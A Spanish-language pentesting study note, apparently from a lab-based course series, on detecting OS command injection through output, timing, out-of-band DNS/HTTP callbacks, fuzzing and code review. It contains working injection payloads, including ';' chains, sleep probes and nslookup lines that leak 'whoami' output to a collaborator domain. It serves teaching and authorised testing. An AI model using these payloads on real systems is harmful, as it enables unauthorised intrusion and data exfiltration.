---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - Command-Injection
Fecha de actualización: 2026-06-13
Nota previa: "[[00 - Introducción a Command Injection]]"
Nota siguiente: "[[02 - Operadores de inyección de comandos]]"
Area: "[[Command Injection.base|Command Injection]]"
---
---

En su forma básica, <mark style="background: #ADCCFFA6;">detectar una command injection es indistinguible de explotarla</mark>: se inyecta un operador seguido de un comando y, si la salida cambia respecto a la esperada, está confirmada. Esa definición —la que da HTB— solo describe el caso de laboratorio: entrada directa, sin sanitización y con la salida reflejada en la respuesta. <mark style="background: #FFB8EBA6;">En un objetivo real ese caso es el menos frecuente</mark>. El trabajo de detección consiste en encontrar la inyección cuando **no** ves el output (ciega), cuando un WAF filtra los metacaracteres, o cuando la entrada llega al comando por un camino indirecto. Esta nota sistematiza esa metodología, que HTB da por supuesta.

# Dónde vive la command injection

Antes de inyectar, hay que saber dónde mirar. Cualquier funcionalidad que internamente invoque un binario del sistema con datos del usuario es candidata. Señales de que detrás hay un comando:

- **Herramientas de red**: `ping`, `traceroute`, `nslookup`, `whois`, comprobadores de host/puerto/conectividad (como el `Host Checker` del lab).
- **Procesado de ficheros**: conversores de PDF, miniaturas de imagen (`ImageMagick`), audio/vídeo (`ffmpeg`), análisis antivirus, extracción de metadatos (`ExifTool` — el vector de la CVE-2021-22205 de GitLab).
- **Administración**: backups, gestión de usuarios del sistema, tareas programadas, "ejecutar script".
- **Otros**: generación de informes, envío de correo (`sendmail`), operaciones `git`, comandos `kubectl`/`docker` en paneles de DevOps.

<mark style="background: #FF5582A6;">Mapea todos los parámetros que alimenten estos flujos con un proxy ([[Interceptación solicitudes|Burp/Caido]]) antes de fuzzear</mark>. Incluye cabeceras y campos JSON, no solo el input obvio del formulario.

# Detección directa (output-based)

En el `Host Checker` del lab, la utilidad pide una IP y ejecuta algo como `ping -c 1 <input>`. Aunque no tengamos el código, la salida —el resultado de un `ping`— delata el comando subyacente:

```bash
ping -c 1 OUR_INPUT
```

Si la entrada no se sanea ni se escapa, inyectamos un [[02 - Operadores de inyección de comandos|operador de inyección]] seguido de un comando de prueba inocuo:

```text
127.0.0.1; whoami
```

Si la respuesta incluye el resultado de `whoami`, la inyección está confirmada. <mark style="background: #FFB8EBA6;">Un primer sondeo no destructivo</mark> es inyectar solo el operador (un `;` o un `'` suelto) y observar el mensaje de error: un error del intérprete de comandos, una traza o un `500` ya es señal de que nuestra entrada altera la estructura del comando. El detalle de cada operador y su comportamiento se trata en la [[02 - Operadores de inyección de comandos|nota siguiente]].

# El caso difícil: blind command injection

Lo habitual en una aplicación moderna: el comando se ejecuta pero su salida **no** vuelve al cliente. Sin output reflejado, la detección directa no sirve y necesitamos un canal lateral. Es exactamente el mismo problema —y la misma solución— que en la [[01 - Introducción a Blind SQL Injection|SQLi ciega]].

## Basada en tiempo

Inyectar un comando que tarde un tiempo conocido y medir la latencia de la respuesta:

```bash
127.0.0.1; sleep 5          # Linux
127.0.0.1 & ping -n 5 127.0.0.1   # Windows (ping bloqueante)
127.0.0.1 & timeout /t 5    # Windows
```

> [!warning]+ Confirma el retardo, no lo asumas
> La detección temporal es la más propensa a falsos positivos: la latencia de red, el *rate limiting* y la carga del servidor introducen ruido. <mark style="background: #FFB86CA6;">Repite la medición con varios valores</mark> (`sleep 0`, `sleep 5`, `sleep 10`) y verifica que el retardo escala de forma proporcional antes de afirmar nada. Es el mismo rigor que exige el [[06 - Identificar SQLi basada en tiempo|oráculo temporal en SQLi]].

## Out-of-band (OOB)

La técnica más fiable contra una inyección totalmente ciega tras un WAF: forzar al servidor a iniciar una conexión hacia un dominio que controlamos. Si la petición llega, hay ejecución.

```bash
127.0.0.1; nslookup pentest.oast.fun        # canal DNS
127.0.0.1; curl http://pentest.oast.fun/    # canal HTTP
```

El salto de calidad: <mark style="background: #8000E1A6;">incrustar la salida de un comando dentro del subdominio consultado exfiltra datos aun en ciego total</mark>:

```bash
127.0.0.1; nslookup `whoami`.pentest.oast.fun
127.0.0.1; nslookup $(whoami).pentest.oast.fun
```

El servidor resuelve `www-data.pentest.oast.fun` y nosotros leemos el subdominio en los logs DNS del colaborador. Es el análogo directo de la [[09 - Exfiltración Out-of-Band por DNS|exfiltración OOB por DNS de SQLi]].

> [!info]+ Colaboradores OOB actuales
> - **`interactsh`** (ProjectDiscovery): self-hosted o público (`oast.fun`, `oast.pro`), con TLS válido. El estándar abierto actual.
> - **Burp Collaborator**: integrado en Burp Pro, cómodo si ya trabajas en Burp.
> - El comodín OOB cubre el peor escenario (ciego sin tiempo fiable) y deja evidencia limpia para el informe.

# Fuzzing de detección

Cuando no sabes si un parámetro es inyectable, fuzzéalo con una lista de payloads que combinen operadores, comandos de prueba y terminadores, observando cambios en **longitud**, **tiempo** o **errores**. Para blind, la técnica más eficaz es lanzar un payload con `sleep`/`ping` por cada entrada y ordenar por tiempo de respuesta —los hits saltan a la vista:

```shell-session
$ ffuf -u "https://target.htb/check?ip=127.0.0.1FUZZ" -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -mt ">4000"
```

`SecLists` incluye `command-injection-commix.txt`; `PayloadsAllTheThings` mantiene la colección de referencia con variantes por SO y por filtro.

# White-box: ir directo al sink

Si tienes acceso al código, la detección es trivial y fiable: busca los *sinks* que invocan la shell (`system`, `exec`, `shell_exec`, `subprocess` con `shell=True`, `Runtime.exec`, `child_process.exec`…) y traza hacia atrás si algún argumento viene de entrada del usuario sin sanear. Es órdenes de magnitud más rápido que el black-box y la base de la [[09 - Prevención de Command Injection|prevención]].

# Automatización: cuándo

- **`commix`** automatiza la detección **y** la explotación; en modo `--skip-heuristics` o con `--technique` afinado es útil cuando ya sospechas del parámetro.
- **`nuclei`** con plantillas de command injection sirve para barridos masivos en bug bounty.
- **Burp Scanner / Caido** detectan inyección durante el *crawling* autenticado.

> [!important]+ La detección manual no es opcional
> <mark style="background: #8000E1A6;">Las herramientas automáticas fallan en contextos raros</mark> —JSON anidado, doble encoding, inyección de segundo orden, filtros parciales— y generan ruido que dispara WAFs y *rate limits*. Detecta y confirma el contexto a mano; lanza la herramienta afinada solo al punto exacto. El arsenal completo y su uso están en la [[10 - Arsenal de herramientas para Command Injection|última nota]].

> [!info]+ Fuentes
> - [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) (detección blind por tiempo y OOB)
> - [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
> - [interactsh](https://github.com/projectdiscovery/interactsh) · [SecLists](https://github.com/danielmiessler/SecLists)

Confirmada la inyección, el siguiente paso es dominar los operadores que permiten encadenar nuestros comandos: [[02 - Operadores de inyección de comandos]].
